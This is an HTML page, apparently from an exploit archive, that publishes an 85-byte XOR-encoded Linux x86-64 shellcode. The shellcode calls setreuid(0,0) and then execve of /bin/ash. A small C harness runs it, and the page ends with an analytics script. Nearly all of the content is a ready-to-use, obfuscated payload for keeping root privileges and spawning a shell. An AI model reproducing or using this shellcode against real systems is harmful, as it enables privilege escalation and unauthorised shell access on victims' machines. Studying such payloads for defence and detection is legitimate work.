<html><head><title>Linux/x86-64 - Linux x86-64 setreuid (0,0) &amp; execve(/bin/ash,NULL,NULL) + XOR encoded - 85 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
# Title: Linux x86-64 setreuid (0,0) &amp; execve(&quot;/bin/ash&quot;,NULL,NULL) + XOR encoded - 85 bytes
# Author: egeektronic &lt;info (at) egeektronic {dot} com&gt;
# Twitter: @egeektronic
# Tested on: Slackware 13.37
# Thanks: Mark Loiseau, entropy [at] phiral.net and metasm developer

unsigned char shellcode[] = 
&quot;\x4d\x31\xc0\x41\xb1\x7f\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb&quot;
&quot;\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48&quot;
&quot;\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x37\x4e\xbf\x37\xfc\xbf&quot;
&quot;\x0e\x37\x4e\x80\x37\x4e\x89\x70\x7a\x94\x6f\x37\x4e\xbf\x37&quot;
&quot;\xfc\xbf\x44\x20\x37\x4e\x89\x37\x4e\xad\x70\x7a\x97\x94\x80&quot;
&quot;\x80\x80\x50\x1d\x16\x11\x50\x1e\x0c\x17&quot;;
int main(void) { ((void (*)())shellcode)(); }

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
